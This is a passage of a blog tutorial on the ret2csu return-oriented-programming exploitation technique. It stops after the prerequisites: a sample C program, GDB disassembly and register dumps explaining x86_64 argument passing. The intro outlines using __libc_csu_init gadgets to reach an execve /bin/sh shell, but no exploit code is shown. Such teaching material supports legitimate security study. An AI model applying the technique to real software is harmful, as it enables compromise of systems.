






<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="light"
  data-auto-appearance="true"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#FFFFFF" />
  
  <title>ret2csu - A Return Oriented Programming Technique &middot; Congo</title>
    <meta name="title" content="ret2csu - A Return Oriented Programming Technique &middot; Congo" />
  
  
  
  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
  ></script>
  
  
  
  
  
  
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
  />
  
  
  
  
  
  
  
  <meta
    name="description"
    content="
      
        {% img /img/pwn-thumbnail.
      
    "
  />
  
  
  
  <link rel="canonical" href="//localhost:1313/blog/ret2csu/" />
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="//localhost:1313/blog/ret2csu/">
  <meta property="og:site_name" content="Congo">
  <meta property="og:title" content="ret2csu - A Return Oriented Programming Technique">
  <meta property="og:description" content="{% img /img/pwn-thumbnail.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2020-04-13T00:00:00+00:00">
    <meta property="article:modified_time" content="2020-04-13T00:00:00+00:00">

  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="ret2csu - A Return Oriented Programming Technique">
<meta name="twitter:description" content="{% img /img/pwn-thumbnail.">

  
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Blogs",
    "name": "ret2csu - A Return Oriented Programming Technique",
    "headline": "ret2csu - A Return Oriented Programming Technique",
    
    "abstract": "{% img \/img\/pwn-thumbnail.",
    "inLanguage": "en",
    "url" : "\/\/localhost:1313\/blog\/ret2csu\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2020",
    "dateCreated": "2020-04-13T00:00:00\u002b00:00",
    "datePublished": "2020-04-13T00:00:00\u002b00:00",
    
    "dateModified": "2020-04-13T00:00:00\u002b00:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "6028"
  }
  </script>


  
  
  
  
  






  
  

  
  
</head>
<body
    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
        >Skip to main content</a
      >
    </div>
    
    
      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
  <nav class="flex items-start justify-between sm:items-center">
    
    <div class="flex flex-row items-center">
      
  <a
    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
    rel="me"
    href="/"
    >Congo</a
  >

    </div>
    
    
      <ul class="flex list-none flex-col text-end sm:flex-row">
        
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href=""
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Blog</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/categories/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Categories</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/tags/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Tags</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                
                
              
            </li>
          
            
              
          
        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex grow flex-col">
      <main id="main-content" class="grow">
        
  <article>
    <header class="max-w-prose">
      
      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        ret2csu - A Return Oriented Programming Technique
      </h1>
      
        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
          





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2020-04-13 00:00:00 &#43;0000 UTC">13 April 2020</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">29 mins</span>
    

    
    
  </div>

  
  


        </div>
      
      
    </header>
    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
      
      <div class="min-h-0 min-w-0 max-w-prose grow">
        <p>{% img /img/pwn-thumbnail.png %}</p>
<p>This is an in-depth guide on <code>ret2csu</code> technique. I tried to make this article as much detailed as I could, including references and some binary to practice it with.</p>
<!-- more -->
<h1 id="what-is-ret2csu" class="relative group">What is ret2csu? <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#what-is-ret2csu" aria-label="Anchor">#</a></span></h1><p>Well, as you already know this a sub-technique of Return Oriented Programming. As you already know that Return Oriented Programming is the technique of using the available gadgets from the binary to craft a payload. The <code>ret2csu</code> technique involves the utilization of the gadgets present in <code>__libc_csu_init</code> to fill in the gaps of unavailable gadgets. For example, what if we want to do an <code>execve</code> syscall, we would need a <code>rdi</code> to pass <code>/bin/sh</code>, <code>rsi</code> for passing <code>0</code> and same for <code>rdx</code> and while looking for gadgets in binary, we didn&rsquo;t  find any <code>pop rdx; ret;</code>, then we use gadgets from <code>__libc_csu_init</code> to craft a chain carefully which will load the contents we gave to the <code>rdx</code>.</p>
<p>Confused? Don&rsquo;t worry, I&rsquo;m gonna explain it in a very detailed way :)</p>
<h1 id="prerequisites" class="relative group">Prerequisites <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#prerequisites" aria-label="Anchor">#</a></span></h1><p>This is included because, what if you&rsquo;re trying to understand it as a beginner, I included this section because this will help you recall the knowledge you need for performing a <code>ret2csu</code> attack. This includes the calling convention of <code>x86_64</code> bit binary and the assembly instructions we will deal with.</p>
<h3 id="calling-convetion" class="relative group">Calling convetion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#calling-convetion" aria-label="Anchor">#</a></span></h3><p>Calling convention refers to the way arguments are passed to a function, like how is the workflow of functions work at low level. Let&rsquo;s take an example program:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="s">&#34;Hello World&#34;</span><span class="p">;</span> <span class="c1">// :p
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">float</span> <span class="n">y</span> <span class="o">=</span> <span class="mf">0.12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;String: %s</span><span class="se">\n</span><span class="s">Integer: %d</span><span class="se">\n</span><span class="s">Float: %f</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s compile it:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"> <span class="err">✘</span> <span class="nl">d4mianwayne@oracle:</span> <span class="err">/</span><span class="nf">tmp</span> <span class="no">$</span> <span class="no">cat</span> <span class="no">sample.c</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include&lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nf">int</span> <span class="no">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="err">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="no">x</span> <span class="err">=</span> <span class="mi">1</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">char</span> <span class="p">*</span><span class="no">s</span> <span class="err">=</span> <span class="err">&#34;</span><span class="no">Hello</span> <span class="no">World</span><span class="err">&#34;</span><span class="c1">; // :p
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">double</span> <span class="no">y</span> <span class="err">=</span> <span class="mi">100</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="err">&#34;</span><span class="no">String</span><span class="p">:</span> <span class="nv">%s</span><span class="err">\</span><span class="no">nInteger</span><span class="p">:</span> <span class="nv">%d</span><span class="err">\</span><span class="no">Double</span><span class="p">:</span> <span class="nv">%lf</span><span class="err">\</span><span class="no">n</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">s</span><span class="p">,</span> <span class="no">x</span><span class="p">,</span> <span class="no">y</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">return</span> <span class="mi">0</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="nl">d4mianwayne@oracle:</span> <span class="err">/</span><span class="nf">tmp</span> <span class="no">$</span> <span class="no">gcc</span> <span class="no">sample.c</span> <span class="p">-</span><span class="no">o</span> <span class="no">sample</span>
</span></span><span class="line"><span class="cl"> <span class="nl">d4mianwayne@oracle:</span> <span class="err">/</span><span class="nf">tmp</span> <span class="no">$</span> <span class="p">.</span><span class="err">/</span><span class="no">sample</span> 
</span></span><span class="line"><span class="cl"><span class="no">String</span><span class="p">:</span> <span class="no">Hello</span> <span class="no">World</span>
</span></span><span class="line"><span class="cl"><span class="nl">Integer:</span> <span class="err">1</span>
</span></span><span class="line"><span class="cl"><span class="nl">Float:</span> <span class="err">100</span><span class="nf">.000000</span>
</span></span></code></pre></div><p>It works perfectly as it&rsquo;s supposed to Let&rsquo;s start gdb and start analyzing the binary workflow:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"> <span class="nl">d4mianwayne@oracle:</span> <span class="err">/</span><span class="nf">tmp</span> <span class="no">$</span> <span class="no">gdb-gef</span> <span class="p">-</span><span class="no">q</span> <span class="no">sample</span>     
</span></span><span class="line"><span class="cl"><span class="no">Reading</span> <span class="no">symbols</span> <span class="no">from</span> <span class="no">sample...</span><span class="p">(</span><span class="no">no</span> <span class="no">debugging</span> <span class="no">symbols</span> <span class="no">found</span><span class="p">)...</span><span class="no">done.</span>
</span></span><span class="line"><span class="cl"><span class="nf">GEF</span> <span class="no">for</span> <span class="no">linux</span> <span class="no">ready</span><span class="p">,</span> <span class="no">type</span> <span class="err">`</span><span class="no">gef</span><span class="err">&#39;</span> <span class="no">to</span> <span class="no">start</span><span class="p">,</span> <span class="err">`</span><span class="no">gef</span> <span class="no">config</span><span class="err">&#39;</span> <span class="no">to</span> <span class="no">configure</span>
</span></span><span class="line"><span class="cl"><span class="err">78</span> <span class="nf">commands</span> <span class="no">loaded</span> <span class="no">for</span> <span class="no">GDB</span> <span class="mi">8</span><span class="no">.1.0.20180409-git</span> <span class="no">using</span> <span class="no">Python</span> <span class="no">engine</span> <span class="mi">3</span><span class="no">.6</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">2</span> <span class="nf">commands</span> <span class="no">could</span> <span class="no">not</span> <span class="no">be</span> <span class="no">loaded</span><span class="p">,</span> <span class="no">run</span> <span class="err">`</span><span class="no">gef</span> <span class="no">missing</span><span class="err">`</span> <span class="no">to</span> <span class="no">know</span> <span class="no">why.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000064a</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000064b</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000064e</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x30</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000652</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x14</span><span class="p">],</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000659</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xc8</span><span class="p">]</span>        <span class="c1"># 0x728
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000000660</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x10</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000664</span> <span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">movsd</span>  <span class="no">xmm0</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xf4</span><span class="p">]</span>        <span class="c1"># 0x760
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000066c</span> <span class="err">&lt;+</span><span class="mi">34</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">movsd</span>  <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">xmm0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000671</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000675</span> <span class="err">&lt;+</span><span class="mi">43</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x14</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000678</span> <span class="err">&lt;+</span><span class="mi">46</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000067c</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">],</span><span class="no">rcx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000680</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">movsd</span>  <span class="no">xmm0</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000685</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000688</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xa9</span><span class="p">]</span>        <span class="c1"># 0x738
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000068f</span> <span class="err">&lt;+</span><span class="mi">69</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000694</span> <span class="err">&lt;+</span><span class="mi">74</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x520</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000699</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000069e</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x000000000000069f</span> <span class="err">&lt;+</span><span class="mi">85</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>The <code>mov</code> lines are moving the variables from base pointers to registers. This is the basic instruction to move an address/value to other address/register.</p>
<blockquote>
<p>The line <code>0x000000000000064b &lt;+1&gt;:	mov    rbp,rsp</code>, this one moves the stack to the base pointer, this is because that way the program can easily retrieve the variables from the base pointer as they&rsquo;re stored at specific offsets.</p>
</blockquote>
<p>Now, let&rsquo;s setup a breakpoint at <code>call printf</code> so that we can analyse how the arguments are being passed to it. GDB time:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="no">main</span> <span class="err">+</span> <span class="mi">74</span>
</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="no">at</span> <span class="mi">0x694</span>
</span></span></code></pre></div><p>The breakpoint has been set, now let&rsquo;s run the program and analyze:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">tmp</span><span class="err">/</span><span class="no">sample</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="no">Legend</span><span class="p">:</span> <span class="no">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">registers</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rax</span>   <span class="p">:</span> <span class="mi">0x1</span>               
</span></span><span class="line"><span class="cl"><span class="no">$rbx</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$rcx</span>   <span class="p">:</span> <span class="mi">0x4059000000000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rdx</span>   <span class="p">:</span> <span class="mi">0x1</span>               
</span></span><span class="line"><span class="cl"><span class="no">$rsp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffde50</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7de59a0</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_dl_fini</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">rbp</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rbp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffde80</span>  <span class="err">→</span>  <span class="mi">0x00005555555546a0</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">r15</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rsi</span>   <span class="p">:</span> <span class="mi">0x0000555555554728</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">Hello</span> <span class="no">World</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rdi</span>   <span class="p">:</span> <span class="mi">0x0000555555554738</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">String</span><span class="p">:</span> <span class="nv">%s</span><span class="err">\</span><span class="no">nInteger</span><span class="p">:</span> <span class="nv">%d</span><span class="err">\</span><span class="no">nDouble</span><span class="p">:</span> <span class="nv">%lf</span><span class="err">\</span><span class="no">n</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rip</span>   <span class="p">:</span> <span class="mi">0x0000555555554694</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">74</span><span class="err">&gt;</span> <span class="no">call</span> <span class="mh">0x555555554520</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r8</span>    <span class="p">:</span> <span class="mi">0x00007ffff7dd0d80</span>  <span class="err">→</span>  <span class="mi">0x0000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r9</span>    <span class="p">:</span> <span class="mi">0x00007ffff7dd0d80</span>  <span class="err">→</span>  <span class="mi">0x0000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r10</span>   <span class="p">:</span> <span class="mi">0x2</span>               
</span></span><span class="line"><span class="cl"><span class="no">$r11</span>   <span class="p">:</span> <span class="mi">0x3</span>               
</span></span><span class="line"><span class="cl"><span class="no">$r12</span>   <span class="p">:</span> <span class="mi">0x0000555555554540</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_start</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">xor</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r13</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdf60</span>  <span class="err">→</span>  <span class="mi">0x0000000000000001</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r14</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$r15</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$eflags</span><span class="p">:</span> <span class="p">[</span><span class="no">zero</span> <span class="no">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">sign</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">resume</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">info</span> <span class="no">registers</span>
</span></span><span class="line"><span class="cl"><span class="nf">rax</span>            <span class="mi">0x1</span>	<span class="mi">0x1</span>
</span></span><span class="line"><span class="cl"><span class="nf">rbx</span>            <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">rcx</span>            <span class="mi">0x4059000000000000</span>	<span class="mi">0x4059000000000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">rdx</span>            <span class="mi">0x1</span>	<span class="mi">0x1</span>
</span></span><span class="line"><span class="cl"><span class="nf">rsi</span>            <span class="mi">0x555555554728</span>	<span class="mi">0x555555554728</span>
</span></span><span class="line"><span class="cl"><span class="nf">rdi</span>            <span class="mi">0x555555554738</span>	<span class="mi">0x555555554738</span>
</span></span><span class="line"><span class="cl"><span class="nf">rbp</span>            <span class="mi">0x7fffffffde80</span>	<span class="mi">0x7fffffffde80</span>
</span></span><span class="line"><span class="cl"><span class="nf">rsp</span>            <span class="mi">0x7fffffffde50</span>	<span class="mi">0x7fffffffde50</span>
</span></span><span class="line"><span class="cl"><span class="nf">r8</span>             <span class="mi">0x7ffff7dd0d80</span>	<span class="mi">0x7ffff7dd0d80</span>
</span></span><span class="line"><span class="cl"><span class="nf">r9</span>             <span class="mi">0x7ffff7dd0d80</span>	<span class="mi">0x7ffff7dd0d80</span>
</span></span><span class="line"><span class="cl"><span class="nf">r10</span>            <span class="mi">0x2</span>	<span class="mi">0x2</span>
</span></span><span class="line"><span class="cl"><span class="nf">r11</span>            <span class="mi">0x3</span>	<span class="mi">0x3</span>
</span></span><span class="line"><span class="cl"><span class="nf">r12</span>            <span class="mi">0x555555554540</span>	<span class="mi">0x555555554540</span>
</span></span><span class="line"><span class="cl"><span class="nf">r13</span>            <span class="mi">0x7fffffffdf60</span>	<span class="mi">0x7fffffffdf60</span>
</span></span><span class="line"><span class="cl"><span class="nf">r14</span>            <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">r15</span>            <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">rip</span>            <span class="mi">0x555555554694</span>	<span class="mh">0x555555554694</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">74</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nf">eflags</span>         <span class="mi">0x206</span>	<span class="p">[</span> <span class="no">PF</span> <span class="no">IF</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">cs</span>             <span class="mi">0x33</span>	<span class="mi">0x33</span>
</span></span><span class="line"><span class="cl"><span class="nf">ss</span>             <span class="mi">0x2b</span>	<span class="mi">0x2b</span>
</span></span><span class="line"><span class="cl"><span class="nf">ds</span>             <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">es</span>             <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">fs</span>             <span class="mi">0x0</span>	<span class="mi">0x0</span>
